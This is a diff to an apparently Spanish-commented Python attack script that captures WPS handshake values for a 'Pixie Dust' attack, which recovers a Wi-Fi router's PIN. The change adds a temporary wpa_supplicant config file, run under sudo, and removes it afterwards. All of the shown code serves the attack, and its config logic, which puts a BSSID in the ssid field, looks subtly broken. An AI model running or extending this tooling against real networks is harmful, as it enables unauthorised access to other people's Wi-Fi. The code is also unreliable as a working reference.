@@ -1,6 +1,7 @@
 import subprocess
 import re
 import os
+import tempfile
 
 def run_command(command, use_sudo=False):
     """Ejecuta un comando de shell y muestra la salida"""
@@ -52,10 +53,24 @@ def scan_wifi(interface):
                 continue
     return redes, bssids, canales
 
+def create_wpa_supplicant_conf(bssid):
+    """Crea un archivo de configuración temporal para wpa_supplicant"""
+    conf_content = f"""
+network={{
+    ssid="{bssid}"
+    key_mgmt=NONE
+}}
+"""
+    conf_file = tempfile.NamedTemporaryFile(delete=False, mode='w')
+    conf_file.write(conf_content)
+    conf_file.close()
+    return conf_file.name
+
 def capture_wps_data(interface, bssid):
     """Captura los datos necesarios para el ataque Pixie Dust usando wpa_supplicant"""
     print(f"Capturando datos WPS de la red con BSSID {bssid}...")
-    wpa_supplicant_command = f"wpa_supplicant -i {interface} -c <(wpa_passphrase {bssid}) -dd"
+    conf_file = create_wpa_supplicant_conf(bssid)
+    wpa_supplicant_command = f"wpa_supplicant -i {interface} -c {conf_file} -dd"
     stdout, stderr = run_command(wpa_supplicant_command, use_sudo=True)
 
     pke = extract_value(stdout, "PKE:")
@@ -64,6 +79,8 @@ def capture_wps_data(interface, bssid):
     ehash2 = extract_value(stdout, "E-Hash2:")
     authkey = extract_value(stdout, "AuthKey:")
     enonce = extract_value(stdout, "E-Nonce:")
+
+    os.remove(conf_file)  # Eliminar el archivo de configuración temporal
 
     if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
         print("No se pudieron capturar todos los datos necesarios para el ataque Pixie Dust.")
